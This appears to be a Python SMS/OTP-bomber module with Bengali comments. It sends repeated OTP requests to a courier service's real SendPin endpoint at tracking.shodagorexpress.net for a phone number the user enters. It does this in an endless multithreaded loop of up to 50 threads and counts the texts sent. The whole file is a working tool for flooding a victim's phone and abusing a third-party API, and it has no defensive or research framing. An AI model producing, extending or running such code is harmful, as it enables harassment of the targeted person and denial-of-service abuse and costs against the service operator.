import requests
from concurrent.futures import ThreadPoolExecutor

# Total requests counter
total_requests = 0

def send_shodagor_request(phone_number):
    """
    শোদাগর এক্সপ্রেসে OTP রিকোয়েস্ট পাঠানো।
    """
    global total_requests
    url = "https://tracking.shodagorexpress.net/Customer/SendPin"
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://tracking.shodagorexpress.net"
    }
    data = {
        "PreBookingRegistrationPhoneNumber": phone_number
    }

    try:
        response = requests.post(url, headers=headers, json=data)
        total_requests += 1
        if response.status_code == 200:
            print(f"[api_11] [{total_requests}] : OTP Sent Successfully!")
        else:
            print(f"[api_11] [{total_requests}] : Failed to send OTP. Status: {response.status_code}")
    except Exception as e:
        print(f"[api_11] Error: {e}")

def main(mobile, threads):
    """
    মাল্টিথ্রেডিং ব্যবহার করে শোদাগর এক্সপ্রেস API তে রিকোয়েস্ট পাঠানো।
    """
    global total_requests

    # মোবাইল নম্বর যাচাই করা
    if len(mobile) != 11 or not mobile.isdigit():
        print("Invalid phone number format. Please provide an 11-digit phone number.")
        return

    # মাল্টিথ্রেডিং দিয়ে রিকোয়েস্ট পাঠানো
    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            futures = [executor.submit(send_shodagor_request, mobile) for _ in range(threads)]
            for future in futures:
                future.result()

if __name__ == "__main__":
    mobile = input("Enter an 11-digit phone number: ")
    threads = int(input("Threads(1-50): "))
    main(mobile, threads)
